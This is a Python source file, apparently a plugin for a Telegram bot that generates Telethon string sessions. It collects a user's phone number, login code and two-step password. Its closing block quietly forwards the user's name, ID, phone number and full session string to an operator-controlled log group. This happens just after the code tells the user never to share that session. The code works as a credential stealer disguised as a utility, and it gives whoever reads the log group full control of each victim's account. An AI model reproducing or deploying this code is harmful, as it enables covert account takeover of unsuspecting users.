import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery
from config import API_ID, API_HASH, LOG_GROUP_ID

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError
)

@Client.on_callback_query(filters.regex("gen_tele"))
async def generate_telethon_session(bot, query: CallbackQuery):
    user_id = query.from_user.id
    name = query.from_user.first_name
    
    await query.message.edit_text(
        "⚡ **ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ...**\n\n"
        "Send your Telegram Phone Number with Country Code.\n"
        "Example: `+919876543210`"
    )

    try:
        phone_msg = await bot.ask(user_id, "📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ:**", timeout=300)
    except:
        return await query.message.reply_text("❌ Timeout! Try again.")
    
    phone_number = phone_msg.text.strip()
    
    await query.message.reply_text("🔄 **sᴇɴᴅɪɴɢ ᴏᴛᴘ...**")

    tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await tele_client.connect()

    try:
        send_code = await tele_client.send_code_request(phone_number)
    except PhoneNumberInvalidError:
        await query.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ!** Restart /start")
        await tele_client.disconnect()
        return
    except Exception as e:
        await query.message.reply_text(f"❌ **Error:** {e}")
        await tele_client.disconnect()
        return

    try:
        otp_msg = await bot.ask(
            user_id, 
            "📩 **sᴇɴᴅ ᴛʜᴇ ᴏᴛᴘ:**\n\nFormat: `1 2 3 4 5` (Space ke saath likhna!)", 
            timeout=300
        )
    except:
        await tele_client.disconnect()
        return await query.message.reply_text("❌ Timeout!")

    otp = otp_msg.text.replace(" ", "")

    try:
        await tele_client.sign_in(phone_number, otp, phone_code_hash=send_code.phone_code_hash)
    except PhoneCodeInvalidError:
        await query.message.reply_text("❌ **ᴡʀᴏɴɢ ᴏᴛᴘ!** Try again.")
        await tele_client.disconnect()
        return
    except PhoneCodeExpiredError:
        await query.message.reply_text("❌ **ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!**")
        await tele_client.disconnect()
        return
    except SessionPasswordNeededError:
        try:
            pwd_msg = await bot.ask(user_id, "🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴏɴ!**\nSend your password:", timeout=300)
        except:
            await tele_client.disconnect()
            return
        password = pwd_msg.text
        try:
            await tele_client.sign_in(password=password)
        except Exception as e:
            await query.message.reply_text(f"❌ **Wrong Password!** {e}")
            await tele_client.disconnect()
            return

    string_session = tele_client.session.save()
    
    text = f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n`{string_session}`\n\n⚠️ *Don't share this with anyone!*"
    try:
        await tele_client.send_message("me", text)
    except Exception:
        pass 

    await tele_client.disconnect()

    await query.message.reply_text(
        "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
    )

    # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
    if LOG_GROUP_ID:
        log_text = (
            f"📦 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n\n"
            f"👤 **User:** {name}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"🛠 **Type:** Telethon\n\n"
            f"✨ **Session (Tap to Copy):**\n<code>{string_session}</code>"
        )
        try:
            await bot.send_message(LOG_GROUP_ID, log_text)
        except:
            pass
          
